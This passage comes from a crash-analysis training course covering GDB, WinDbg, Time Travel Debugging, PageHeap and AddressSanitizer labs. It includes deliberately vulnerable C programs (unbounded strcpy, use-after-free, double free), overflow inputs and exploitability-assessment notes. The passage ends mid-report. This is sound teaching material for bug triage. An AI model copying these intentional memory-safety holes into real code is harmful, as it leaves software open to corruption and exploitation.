**Example backtrace** (notice `process_data` is NOT shown):

```text
#0  __pthread_kill_implementation at ./nptl/pthread_kill.c:44
#1-4  ... (signal handling) ...
#5  __libc_message_impl at ../sysdeps/posix/libc_fatal.c:134
#6  malloc_printerr (str="malloc(): corrupted top size")
#7  _int_malloc at ./malloc/malloc.c:4447
#8  __GI___libc_malloc
#9  add_entry (input="post-overflow entry") at vulnerable_delayed.c:17  <-- CRASH HERE
#10 main at vulnerable_delayed.c:78
```

The crash is in `add_entry()` during a `malloc()` call - the allocator detected that heap metadata was corrupted. But the **actual bug** is in `process_data()` which overwrote heap structures with 'A's.

#### Exercise Part 2: Reproduce with ASAN

```bash
# Build WITH ASAN
gcc -g -O0 -fsanitize=address -fno-omit-frame-pointer \
    -U_FORTIFY_SOURCE -o delayed_vuln_asan src/vulnerable_delayed.c

# Now ASAN catches the overflow AT THE SOURCE (even with small overflow!)
./delayed_vuln_asan $(python3 -c "print('A'*20)")
```

**ASAN Output** (shows TRUE root cause):

```text
[*] Creating linked list entries...
[+] Added entry at 0x503000000040 (data=0x502000000010, next=(nil))
[+] Added entry at 0x503000000070 (data=0x502000000030, next=0x503000000040)

[*] Processing user input (20 bytes)...
[*] Allocated 16-byte buffer at 0x502000000050
[*] About to copy 20 bytes into 16-byte buffer...
=================================================================
==3871==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x502000000060 at pc 0x7174a0ca7923 bp 0x7ffee2ef7d60 sp 0x7ffee2ef7508
WRITE of size 21 at 0x502000000060 thread T0
    #0 0x7174a0ca7922 in strcpy ../../../../src/libsanitizer/asan/asan_interceptors.cpp:563
    #1 0x6273088c443c in process_data src/vulnerable_delayed.c:36
    #2 0x6273088c46e8 in main src/vulnerable_delayed.c:75
    #3 0x7174a082a1c9 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
    #4 0x7174a082a28a in __libc_start_main_impl ../csu/libc-start.c:360
    #5 0x6273088c41e4 in _start (/home/dev/crash_analysis_lab/delayed_vuln_asan+0x11e4) (BuildId: 5ba4175df72d24b28ce5932020c5be09d8b70064)

0x502000000060 is located 0 bytes after 16-byte region [0x502000000050,0x502000000060)
allocated by thread T0 here:
    #0 0x7174a0cfd9c7 in malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:69
    #1 0x6273088c43e7 in process_data src/vulnerable_delayed.c:31
    #2 0x6273088c46e8 in main src/vulnerable_delayed.c:75
    #3 0x7174a082a1c9 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
    #4 0x7174a082a28a in __libc_start_main_impl ../csu/libc-start.c:360
    #5 0x6273088c41e4 in _start (/home/dev/crash_analysis_lab/delayed_vuln_asan+0x11e4) (BuildId: 5ba4175df72d24b28ce5932020c5be09d8b70064)

SUMMARY: AddressSanitizer: heap-buffer-overflow ../../../../src/libsanitizer/asan/asan_interceptors.cpp:563 in strcpy
```

#### Exercise Part 3: Find Root Cause with Watchpoints/rr

When you can't use ASAN (closed-source binary, can't recompile):

```bash
# Method A: Hardware watchpoints in GDB
gdb ./delayed_vuln

# Break in process_data first to skip add_entry's strcpy calls
(gdb) break process_data
(gdb) run $(python3 -c "print('A'*200)")
# Hits breakpoint in process_data

# Now set breakpoint on strcpy and continue - next hit is the vulnerable one
(gdb) break strcpy
(gdb) continue
# Stops at strcpy inside process_data

# Get buffer address from RDI register (destination argument)
(gdb) print/x $rdi
# Output: $1 = 0x555555559730

# Set watchpoint on top chunk size field (buffer + 0x18 for 16-byte alloc)
(gdb) set $buf = $rdi
(gdb) watch *(long*)($buf + 0x18)

(gdb) continue
# Watchpoint triggers during strcpy - showing EXACT instruction causing corruption
# Output:
#   Hardware watchpoint 3: *(long*)($buf + 0x18)
#   Old value = 133313
#   New value = 133185
#   __strcpy_sse2 () at ../sysdeps/x86_64/multiarch/strcpy-sse2.S:110
#
# Backtrace shows the corruption path:
#   __strcpy_sse2+163    <- overflow happens HERE
#   process_data+123     <- vulnerable function
#   main+201
```

#### Exercise Part 4: Document the Difference

Create a comparison table of what you observed:

```markdown
| Aspect               | Without ASAN             | With ASAN               |
| -------------------- | ------------------------ | ----------------------- |
| Crash Location       | add_entry() or cleanup() | process_data():strcpy() |
| Signal               | SIGABRT (allocator)      | SIGABRT (ASAN)          |
| Backtrace shows bug? | NO                       | YES                     |
| Root cause visible?  | NO                       | YES                     |
| Time to identify     | 30+ minutes              | 5 seconds               |
```

#### Lab Deliverables

1. **Screenshot/log** of non-ASAN crash (showing misleading backtrace)
2. **Screenshot/log** of ASAN crash (showing true root cause)
3. **GDB transcript** showing watchpoint catching the overflow
4. **Written explanation** (2-3 sentences) of why the crash and bug are in different locations

**Success Criteria**:

- Understand that crash site ≠ bug site for heap corruption
- Can use ASAN to find true root cause
- Can use watchpoints/rr to trace corruption without ASAN
- Can explain the delayed corruption phenomenon

#### Identifying Vulnerability Types Without Source

**1. Recognizing Heap UAF in Closed-Source**:

```bash
# Step 1: Check if crash is on object method call
0:000> u @rip
# Look for: call qword ptr [rax+XX]  <- vtable dispatch

# Step 2: Check the object pointer
0:000> dq @rcx L8    # Dump supposed object
# If first qword looks like valid vtable, but other fields look wrong → UAF

# Step 3: Check heap state (requires PageHeap enabled)
0:000> !heap -p -a @rcx
# Look for "free" status or "freed and reallocated"

# Step 4: Back-trace with TTD (if available)
0:000> r rcx
# rcx=000001efe2393fc0  <- The freed pointer

# Find all heap frees and check parameters for matching address
0:000> dx @$cursession.TTD.Calls("ntdll!RtlFreeHeap")
# Examine each one:
0:000> dx @$cursession.TTD.Calls("ntdll!RtlFreeHeap")[0].Parameters
0:000> dx @$cursession.TTD.Calls("ntdll!RtlFreeHeap")[1].Parameters
# Look for Parameters[2] matching your crash address

# Navigate to the free that matches
0:000> dx @$cursession.TTD.Calls("ntdll!RtlFreeHeap")[2].TimeStart.SeekTo()

# Now at the free - examine call stack
0:000> k
```

**2. Recognizing Type Confusion**:

```bash
# Pattern: Valid object, wrong type being assumed
# - Object pointer is valid
# - Vtable is valid but for WRONG class
# - Crash when accessing field at wrong offset

# Check: Compare vtable to known vtables
0:000> dps poi(@rcx) L10    # Dump vtable methods
# Cross-reference with known class vtables in the binary

# Use TTD to find where wrong type was assumed
0:000> !tt 0
0:000> ba r 8 @rcx          # Break on reads of this object (can be noisy)
0:000> g                     # Observe the code that reads/uses the object
```

**3. Recognizing Logic Bugs**:

```bash
# Logic bugs often don't crash in memory functions
# Instead: crashes in application-specific code

# Signs of logic bug:
# - Crash NOT in heap/string functions
# - Values are valid but unexpected
# - Race condition patterns (varies between runs)
# - File/network state inconsistency

# Example: Race condition in file handling
0:000> k
# Call stack shows file operation, but state is inconsistent

# Use TTD to check for interleaved operations
0:000> !tt 0
0:000> bp kernelbase!CreateFileW
0:000> bp kernelbase!CloseHandle
0:000> g
# Watch for close-then-use patterns
```

### Practical Exercise

> [!NOTE]
> You should have already built the vulnerable test suite earlier in this section. If not, scroll up to "Building a Vulnerable Test Suite (Do This First!)" and complete that setup before continuing.

#### Alternative: Pre-built Vulnerable Targets

If you want additional crash samples beyond the test suite:

```bash
# CASR includes test cases with sample crash reports
git clone --depth 1 https://github.com/ispras/casr.git ~/casr-tests
ls ~/casr-tests/casr/tests/casr_tests/casrep/

# Fuzzing101 has vulnerable targets with known bugs
git clone --depth 1 https://github.com/antonio-morales/Fuzzing101.git ~/Fuzzing101
# Follow Exercise1 to build xpdf with bugs
```

#### Tasks

**Task**: Analyze 5 different crash types and classify each

Using the test suite you built above (or crashes from your Week 2 fuzzing), analyze each crash type.

**Crash Types to Generate and Analyze (Linux)**:

1. `stack_overflow` - Run: `./vuln_no_protect 1 $(python3 -c "print('A'*200)")`
2. `heap_overflow` - Run: `./vuln_asan 2 $(python3 -c "print('A'*100)")`
3. `use_after_free` - Run: `./vuln_asan 3`
4. `double_free` - Run: `./vuln_asan 4`
5. `null_deref` - Run: `./vuln_no_protect 5 0`

**Crash Types to Generate and Analyze (Windows with TTD)**:

1. `stack_overflow` - Record with TTD: `vuln_win.exe 1 AAAA...(200+ chars)`
2. `heap_overflow` - Enable PageHeap first, then: `vuln_win.exe 2 AAAA...(100+ chars)`
3. `use_after_free` - Enable PageHeap first, then: `vuln_win.exe 3`
4. `double_free` - Run: `vuln_win.exe 4`
5. `null_deref` - Run: `vuln_win.exe 5 0`

**For Each Crash (WinDbg)**:

1. **Load and Get Overview**:

   ```bash
   # For dump files:
   windbg -z <dump_file>
   !analyze -v

   # For TTD traces:
   # File → Open trace file → Select .run file
   0:000> g              # Run to crash
   0:000> !analyze -v
   ```

2. **Examine Crash State**:

   ```bash
   0:000> k          # Call stack
   0:000> r          # Registers
   0:000> u @rip     # Current instruction
   0:000> dps @rsp L20  # Stack contents
   ```

3. **For TTD Traces - Find Root Cause**:

   ```bash
   0:000> !tt 0                    # Go to start
   0:000> dx @$cursession.TTD.Calls("ntdll!RtlFreeHeap")  # Find heap frees
   0:000> dx @$cursession.TTD.Memory(<addr>, <addr>+8, "w")  # Find writes
   ```

**For Each Crash (GDB/Linux)**:

1. **Load and Get Overview**:

   ```bash
   gdb ./vuln_no_protect core
   bt                    # Backtrace
   info registers        # Registers
   ```

2. **Examine Crash State**:

   ```bash
   x/10i $rip           # Disassemble at crash
   x/20gx $rsp          # Stack contents
   ```

**Classify Bug Type**:

- What register/memory caused crash?
- What operation was attempted?
- What's the root cause?

**Assess Exploitability**:

- Can attacker control crash address?
- Is value being written controllable?
- Are there mitigations active?

**Document Findings**:

```markdown
## Crash: stack_overflow

- **Type**: Stack Buffer Overflow
- **Location**: vulnerable_function+0x42
- **Cause**: strcpy without bounds checking
- **Controlled**: Return address, saved registers
- **Exploitability**: High (if DEP/ASLR bypassed)
```

**Success Criteria**:

- All 5 dumps analyzed
- Correct crash type identified for each
- Root cause understood
- Exploitability assessment provided
- Findings documented clearly

### Lab: PageHeap/AppVerifier for Windows

> [!IMPORTANT]
> PageHeap is the Windows equivalent of ASAN for heap bugs—it surrounds allocations with guard pages and tracks allocation/free stacks.

#### What PageHeap Does

PageHeap (part of Application Verifier / gflags) modifies the Windows heap to:

- Place each allocation on its own page boundary
- Add inaccessible guard pages after allocations
- Keep freed memory inaccessible (catches UAF immediately)
- Record allocation and free stack traces

```text
Normal Heap:                    PageHeap (Full):
┌──────────────────────┐       ┌──────────────────────┐
│ alloc1 │ alloc2 │ ...│       │ alloc1 │ GUARD PAGE  │
└──────────────────────┘       ├──────────────────────┤
                               │ alloc2 │ GUARD PAGE  │
Overflow goes undetected       └──────────────────────┘
                               Overflow hits guard → CRASH
```

#### Lab Setup

> [!TIP]
> You can also use `vuln_win.exe` from the "Building a Windows Vulnerable Test Suite" section earlier in Day 1.
> The dedicated `heap_vuln.c` below is simpler and focused specifically on heap bugs for this lab.

**1. Create Vulnerable Windows Program**:

```c
// c:\CrashAnalysisLab/src/heap_vuln.c - Compile with: cl /Zi src/heap_vuln.c
#include <windows.h>
#include <stdio.h>
#include <string.h>

void heap_overflow(char* input) {
    char* buf = (char*)HeapAlloc(GetProcessHeap(), 0, 32);
    printf("[*] Allocated 32 bytes at %p\n", buf);

    // OVERFLOW: strcpy has no bounds check
    strcpy(buf, input);
    printf("[*] Copied: %s\n", buf);

    HeapFree(GetProcessHeap(), 0, buf);
}

void use_after_free() {
    char* buf = (char*)HeapAlloc(GetProcessHeap(), 0, 64);
    printf("[*] Allocated at %p\n", buf);
    strcpy(buf, "Hello World");

    HeapFree(GetProcessHeap(), 0, buf);
    printf("[*] Freed\n");

    // UAF: Access after free
    printf("[*] UAF read: %s\n", buf);
    buf[0] = 'X';  // UAF write
}

int main(int argc, char** argv) {
    if (argc < 2) {
        printf("Usage: %s <1|2> [input]\n", argv[0]);
        printf("  1 <input> - Heap overflow\n");
        printf("  2         - Use-after-free\n");
        return 1;
    }

    switch(atoi(argv[1])) {
        case 1:
            if (argc < 3) return 1;
            heap_overflow(argv[2]);
            break;
        case 2:
            use_after_free();
            break;
    }

    printf("[*] Done\n");
    return 0;
}
```

**2. Compile the Test Program**:

```bash
cd c:\CrashAnalysisLab
# Open "x64 Native Tools Command Prompt for VS 2022"
cl /Zi /Od src/heap_vuln.c /link /DEBUG
```

#### Step-by-Step PageHeap Lab

**Step 1: Run WITHOUT PageHeap (observe the problem)**:

```bash
# Without PageHeap, many heap bugs don't crash immediately
heap_vuln.exe 1 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
# May print "Done" without crashing - corruption went undetected!

heap_vuln.exe 2
# May print stale data without crashing - UAF went undetected!
```

**Step 2: Enable PageHeap**:

```bash
# Enable FULL page heap for target.exe
# Run as Administrator
"C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\gflags.exe" /p /enable heap_vuln.exe /full

# Verify it's enabled
"C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\gflags.exe" /p
# Should show: heap_vuln.exe: page heap enabled

# Alternative: Using Application Verifier GUI
#appverif.exe
# Add heap_vuln.exe → Check "Heaps" under "Basics"
```

**Step 3: Reproduce with PageHeap (crashes immediately)**:

```bash
# Now the overflow crashes immediately
heap_vuln.exe 1 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"

# UAF also crashes immediately
heap_vuln.exe 2
```

**Step 4: Analyze in WinDbg**:

```bash
# Start WinDbg with the target executable
# File -> Open Executable -> heap_vuln.exe
# Then set arguments in the dialog:
# 1 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
```

```bash
# In WinDbg, continue past loader breakpoints until crash:
0:000> g
# You may hit multiple breakpoints - keep pressing 'g' until you see:
# (xxxx.xxx): Access violation - code c0000005 (first chance)

# Example crash output:
# heap_vuln!__entry_from_strcat_in_strcpy+0x1f:
# 00007ff7`6a3e08b2 4889040a  mov qword ptr [rdx+rcx],rax ds:0000015b`52cf6ffc=???

# View the call stack - shows exact crash location:
0:000> kb
 # RetAddr           : Call Site
# 00 00007ff7`6a367295 : heap_vuln!__entry_from_strcat_in_strcpy+0x1f
# 01 00007ff7`6a367411 : heap_vuln!heap_overflow+0x45 [heap_vuln.c @ 11]  <-- strcpy line!
# 02 00007ff7`6a3677c8 : heap_vuln!main+0xa1 [heap_vuln.c @ 40]
# 03 (Inline Function) : heap_vuln!invoke_main+0x22
# 04 00007ffd`23dbe8d7 : heap_vuln!__scrt_common_main_seh+0x10c
# 05 00007ffd`24f6c53c : KERNEL32!BaseThreadInitThunk+0x17

# Check registers - reveals the overflow data:
0:000> r
# rax=4141414141414141   <-- "AAAAAAAA" being written (0x41 = 'A')
# rdx=0000015b52c86fe0   <-- Buffer base address
# rcx=000000000007001c   <-- Offset into buffer (way past 32 bytes!)
# rdx+rcx = target address in guard page

# Get detailed heap information for the buffer address:
# Use the address from r11 (guard page area) or the buffer start
0:000> !heap -p -a 0000015b52cf6fe0
    address 0000015b52cf6fe0 found in
    _DPH_HEAP_ROOT @ 15b529e1000
    in busy allocation (DPH_HEAP_BLOCK:  UserAddr      UserSize - VirtAddr      VirtSize)
                         15b529ea618:   15b52cf6fe0         20 - 15b52cf6000       2000
    # UserSize: 0x20 = 32 bytes (your HeapAlloc request)
    # VirtSize: 0x2000 = 8KB page allocated by PageHeap for protection

    # ALLOCATION STACK TRACE (shows where memory was allocated):
    00007ffd24f30727 ntdll!RtlDebugAllocateHeap+0x387
    00007ffd24f32f3a ntdll!RtlpAllocateHeap+0x246a
    00007ffd24efd0d1 ntdll!RtlpAllocateNTHeapInternal+0x3d1
    00007ffd24efcca4 ntdll!RtlAllocateHeap+0xad4
    00007ff76a367270 heap_vuln!heap_overflow+0x20 [heap_vuln.c @ 6]   <-- HeapAlloc call
    00007ff76a367411 heap_vuln!main+0xa1 [heap_vuln.c @ 40]
    00007ff76a3677c8 heap_vuln!__scrt_common_main_seh+0x10c

# Full automated analysis:
0:000> !analyze -v
# Shows: HEAP_CORRUPTION, faulting module, and root cause analysis
```

**For UAF (Use-After-Free) Analysis**:

```bash
# Run with UAF test case:
windbg heap_vuln.exe 2

0:000> g
# Keep pressing 'g' past loader breakpoints until crash:
# (xxxx.xxxx): Access violation - code c0000005 (first chance)
# heap_vuln!strnlen+0x84:  <-- Crash in printf trying to read freed string

# View call stack - shows UAF access path:
0:000> kb
0f heap_vuln!use_after_free+0x75 [heap_vuln.c @ 26]  <-- printf("%s", ptr) after free
10 heap_vuln!main+0xa9 [heap_vuln.c @ 43]

# Get heap info - NOTE: use !ext.heap on newer WinDbg versions
0:000> !ext.heap -p -a 0000022bc3fa6fc0
    address 0000022bc3fa6fc0 found in
    _DPH_HEAP_ROOT @ 22bc3c91000
    in free-ed allocation    <-- PageHeap knows this was FREED!

    # FREE STACK TRACE (shows where memory was freed):
    00007ffd24f6b2d3 ntdll!RtlDebugFreeHeap+0x37
    00007ffd24f0370c ntdll!RtlpFreeHeap+0x178c
    00007ffd24f59300 ntdll!RtlFreeHeap+0x620
    00007ff76a367328 heap_vuln!use_after_free+0x58 [heap_vuln.c @ 22]  <-- HeapFree call!
    00007ff76a367419 heap_vuln!main+0xa9 [heap_vuln.c @ 43]

# This tells you:
# 1. Memory WAS freed (line 22: HeapFree)
# 2. Then accessed (line 26: printf with freed ptr)
# 3. PageHeap protected the freed memory, causing immediate crash
```

**Step 5: Check Mitigations with PowerShell**:

```powershell
# Check mitigations for a running process
# First, run heap_vuln.exe under WinDbg (paused), then in another terminal:
Get-Process heap_vuln | Get-ProcessMitigation

# Example output for heap_vuln.exe:
ProcessName: heap_vuln
Source     : Running Process
Id         : 10468

DEP:
  Enable                : ON      # Can't execute code on stack/heap
  EmulateAtlThunks      : ON

ASLR:
  BottomUp              : ON      # Address randomization active
  HighEntropy           : ON      # 64-bit high entropy ASLR
  ForceRelocateImages   : OFF

CFG:
  Enable                : OFF     # Not compiled with /guard:cf

SEHOP:
  Enable                : ON      # SEH overwrite protection

# Key mitigations for exploitability assessment:
# - DEP ON = need ROP chain, can't just jump to shellcode
# - ASLR ON = need info leak to find gadgets/addresses
# - CFG OFF = indirect calls not protected (easier to exploit)
# - SEHOP ON = can't easily overwrite SEH handlers

# Check system-wide defaults:
Get-ProcessMitigation -System

# Check PE header mitigations in WinDbg:
0:000> !dh -f heap_vuln
#          8160 DLL characteristics
#                 High Entropy Virtual Addresses
#                 Dynamic base         <-- ASLR
#                 NX compatible        <-- DEP
```

**Step 6: Disable PageHeap After Analysis**:

```bash
# IMPORTANT: Always disable PageHeap after debugging!
# PageHeap has significant performance/memory overhead

# If you used gflags:
"C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\gflags.exe" /p /disable heap_vuln.exe

# Verify it's disabled:
"C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\gflags.exe" /p
# Should NOT show heap_vuln.exe in the list

# If you used Application Verifier (appverif.exe):
# 1. Open appverif.exe
# 2. Select heap_vuln.exe from the list
# 3. Uncheck all tests or click "Delete Application"
# 4. Click Save

# Alternative: Clear all gflags for the executable
"C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\gflags.exe" /i heap_vuln.exe -ust -hpa
```

#### Lab Deliverables

1. **Screenshot**: gflags showing PageHeap enabled
2. **WinDbg log**: `!heap -p -a` output showing allocation stack
3. **Comparison**: Document behavior with/without PageHeap
4. **PowerShell output**: `Get-ProcessMitigation` results

### Key Takeaways

1. **WinDbg is essential**: Primary tool for Windows crash analysis
2. **Symbols are crucial**: Without symbols, analysis is much harder
3. **Crash patterns are recognizable**: Common patterns indicate specific bug types
4. **Context matters**: Same crash can have different exploitability based on mitigations
5. **Practice builds speed**: Analyzing many crashes makes patterns obvious
6. **Pattern recognition is essential**: Learn to recognize crash signatures without symbols
7. **Registers tell the story**: Systematic register analysis reveals control
8. **Scripts accelerate triage**: Automate repetitive analysis tasks
9. **TTD is powerful**: Time-travel debugging helps even without symbols
10. **Document methodology**: Structured reports help track analysis
11. **PageHeap is essential**: Windows heap bug detection requires it

### Discussion Questions

1. How do stack cookies change the exploitability of stack overflows?
2. What information can be gained from a crash even if it's not directly exploitable?
3. How does Page Heap help identify heap corruption root causes?
4. How does Time Travel Debugging (TTD) change your approach to finding where memory corruption originated, compared to traditional forward-only debugging?

## Day 2: AddressSanitizer and Memory Error Classification

- **Goal**: Use AddressSanitizer (ASAN) to detect and classify memory errors with detailed diagnostics.
- **Activities**:
  - _Reading_:
    - [AddressSanitizer Algorithm](https://github.com/google/sanitizers/wiki/AddressSanitizerAlgorithm)
    - [AddressSanitizer Memory Error Types](https://clang.llvm.org/docs/AddressSanitizer.html)
  - _Online Resources_:
    - [LLVM Sanitizer Documentation](https://clang.llvm.org/docs/index.html)
    - [Google Sanitizers Wiki](https://github.com/google/sanitizers/wiki)
  - _Tool Setup_:
    - Clang compiler with ASAN support
    - Visual Studio 2022+ (for Windows ASAN)
  - _Exercise_:
    - Compile test programs with ASAN
    - Trigger and classify 10 different memory error types

### Understanding AddressSanitizer

> [!TIP]
> **Ubuntu Quick Setup** - Copy this environment block before running ASAN-compiled binaries:
>
> ```bash
> # Recommended ASAN/UBSAN environment for Ubuntu
> export ASAN_SYMBOLIZER_PATH=$(command -v llvm-symbolizer)
> export ASAN_OPTIONS="abort_on_error=1:symbolize=1:detect_leaks=1:disable_coredump=0"
> export UBSAN_OPTIONS="print_stacktrace=1:halt_on_error=1"
> ```
>
> **Key options explained**:
>
> - `abort_on_error=1`: Abort on first error (generates signal for debugging)
> - `disable_coredump=0`: Allow core dump generation even with ASAN
> - `detect_leaks=1`: Enable LeakSanitizer (LSan)
> - `symbolize=1`: Show source file/line in reports
>
> **Note on ASAN + core dumps**: ASAN often calls `abort()` on errors, which generates SIGABRT (-6), not SIGSEGV (-11). Set `disable_coredump=0` if you need core dumps for post-mortem analysis.

**What is ASAN?**:

- Compiler instrumentation tool for detecting memory errors
- Inserts runtime checks around memory operations
- Uses "shadow memory" to track allocation state
- Detects: buffer overflows, UAF, double-free, memory leaks, and more

**How It Works**:

1. **Shadow Memory**: 1 shadow byte tracks 8 bytes of application memory
2. **Red Zones**: Poisoned memory surrounding allocations
3. **Quarantine**: Freed memory held before reuse to catch UAF
4. **Stack Instrumentation**: Red zones around stack variables

#### Installing and Using ASAN (Linux)

**With Clang**:

```bash
# Install clang
sudo apt install clang llvm

# Navigate to lab directory (created in Day 1)
cd ~/crash_analysis_lab

# Compile with ASAN (using vulnerable_suite.c from Day 1)
clang -g -O1 -fsanitize=address -fno-omit-frame-pointer src/vulnerable_suite.c -o vuln_asan

# Enable symbolization
export ASAN_SYMBOLIZER_PATH=$(command -v llvm-symbolizer)
export ASAN_OPTIONS="abort_on_error=1:symbolize=1:detect_leaks=1:disable_coredump=0"
export UBSAN_OPTIONS="print_stacktrace=1:halt_on_error=1"

# Run and observe detailed error report (test case 3 = UAF)
./vuln_asan 3
```

**With GCC**:

```bash
# GCC also supports ASAN
cd ~/crash_analysis_lab
gcc -g -O1 -fsanitize=address -fno-omit-frame-pointer -D_FORTIFY_SOURCE=0 src/vulnerable_suite.c -o vuln_asan1

# Run with same environment variables (test case 1 = stack overflow)
./vuln_asan1 1 $(python3 -c "print('A'*200)")
```

#### ASAN Error Types and Reports

**1. Heap Buffer Overflow**:

**Vulnerable Code**:

```c
// ~/crash_analysis_lab/src/heap.c
#include <stdlib.h>
#include <string.h>

int main() {
    char *buf = malloc(10);
    strcpy(buf, "This is too long!");  // Overflow!
    free(buf);
    return 0;
}
```

```bash
cd ~/crash_analysis_lab
gcc -g -O0 -fsanitize=address -fno-omit-frame-pointer -D_FORTIFY_SOURCE=0 src/heap.c -o heap
./heap
```

**ASAN Report**:

```text
==1330==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x50200000001a at pc 0x773226afb303 bp 0x7ffdf29dd780 sp 0x7ffdf29dcf28
WRITE of size 18 at 0x50200000001a thread T0
    #0 0x773226afb302 in memcpy ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors_memintrinsics.inc:115
    #1 0x5ac25166523d in main src/heap.c:6
    #2 0x77322662a1c9 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
    #3 0x77322662a28a in __libc_start_main_impl ../csu/libc-start.c:360
    #4 0x5ac251665144 in _start (/home/dev/crash_analysis_lab/heap+0x1144) (BuildId: 060cf895aa12e860df15a930f5880bac28c424b2)
0x50200000001a is located 0 bytes after 10-byte region [0x502000000010,0x50200000001a)
allocated by thread T0 here:
    #1 0x5ac25166521e in main src/heap.c:5
    #2 0x77322662a1c9 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
    #3 0x77322662a28a in __libc_start_main_impl ../csu/libc-start.c:360
    #4 0x5ac251665144 in _start (/home/dev/crash_analysis_lab/heap+0x1144) (BuildId: 060cf895aa12e860df15a930f5880bac28c424b2)
SUMMARY: AddressSanitizer: heap-buffer-overflow ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors_memintrinsics.inc:115 in memcpy
Shadow bytes around the buggy address:
  0x501ffffffd80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x501ffffffe00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x501ffffffe80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x501fffffff00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x501fffffff80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x502000000000: fa fa 00[02]fa fa fa fa fa fa fa fa fa fa fa fa
  0x502000000080: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x502000000100: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x502000000180: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x502000000200: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x502000000280: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
```

**Shadow Memory Interpretation**:

- `fa` = heap redzone (poison bytes around allocations)
- `00` = 8 fully addressable bytes
- `02` = 2 more addressable bytes (totaling the 10-byte allocation)
- `[02]` bracket shows exactly where the overflow was detected

**Analysis**:

- **Error**: heap-buffer-overflow
- **Operation**: WRITE of size 18 (string "This is too long!" + null terminator)
- **Location**: heap.c:6 (strcpy transformed to memcpy)
- **Allocation**: 10-byte buffer allocated at line 5
- **Overflow**: 8 bytes past end of allocation (detected at byte 10)

**2. Stack Buffer Overflow**:

**Vulnerable Code**:

```c
// ~/crash_analysis_lab/src/stack.c
#include <string.h>

void vulnerable_function(char *input) {
    char buffer[16];
    strcpy(buffer, input);  // No bounds check!
}

int main() {
    vulnerable_function("AAAAAAAAAAAAAAAAAAAAAAAAAAAA");
    return 0;
}
```

```bash
gcc -g -O0 -fsanitize=address -fno-omit-frame-pointer -D_FORTIFY_SOURCE=0 src/stack.c -o stack
./stack
```

**ASAN Report**:

```text
==1349==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x732093f00030 at pc 0x7320964a7923 bp 0x7ffd05f3a950 sp 0x7ffd05f3a0f8
WRITE of size 29 at 0x732093f00030 thread T0
    #0 0x7320964a7922 in strcpy ../../../../src/libsanitizer/asan/asan_interceptors.cpp:563
    #1 0x5a7f7e0e52aa in vulnerable_function src/stack.c:5
    #2 0x5a7f7e0e5314 in main src/stack.c:9
    #3 0x73209602a1c9 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
    #4 0x73209602a28a in __libc_start_main_impl ../csu/libc-start.c:360
    #5 0x5a7f7e0e5144 in _start (/home/dev/crash_analysis_lab/stack+0x1144) (BuildId: 03503cc1bce726df73220dfdcbbb15bc88eceb61)

Address 0x732093f00030 is located in stack of thread T0 at offset 48 in frame
    #0 0x5a7f7e0e5218 in vulnerable_function src/stack.c:3

  This frame has 1 object(s):
    [32, 48) 'buffer' (line 4) <== Memory access at offset 48 overflows this variable
HINT: this may be a false positive if your program uses some custom stack unwind mechanism, swapcontext or vfork
      (longjmp and C++ exceptions *are* supported)
SUMMARY: AddressSanitizer: stack-buffer-overflow ../../../../src/libsanitizer/asan/asan_interceptors.cpp:563 in strcpy
Shadow bytes around the buggy address:
  0x732093effd80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x732093effe00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x732093effe80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x732093efff00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x732093efff80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x732093f00000: f1 f1 f1 f1 00 00[f3]f3 00 00 00 00 00 00 00 00

```

**Analysis**:

- **Error**: stack-buffer-overflow
- **Operation**: WRITE of size 29 (28 'A' characters + null terminator)
- **Location**: stack.c:5 (strcpy in vulnerable_function)
- **Buffer**: 16-byte buffer 'buffer' at stack frame offset [32, 48)
- **Overflow**: 13 bytes past end of allocation (access at offset 48, buffer ends at 48)
- **Shadow byte `f1`**: Stack left redzone
- **Shadow byte `f3`**: Stack right redzone (where overflow was detected)

**3. Use-After-Free**:

**Vulnerable Code**:

```c
// ~/crash_analysis_lab/src/uaf.c
#include <stdlib.h>

int main() {
    int *ptr = malloc(sizeof(int));
    *ptr = 42;
    free(ptr);
    *ptr = 43;  // UAF!
    return 0;
}
```

```bash
gcc -g -O0 -fsanitize=address -fno-omit-frame-pointer -D_FORTIFY_SOURCE=0 src/uaf.c -o uaf
./uaf
```

**ASAN Report**:

```text
==1371==ERROR: AddressSanitizer: heap-use-after-free on address 0x502000000010 at pc 0x59df62e93267 bp 0x7ffe0df212f0 sp 0x7ffe0df212e0
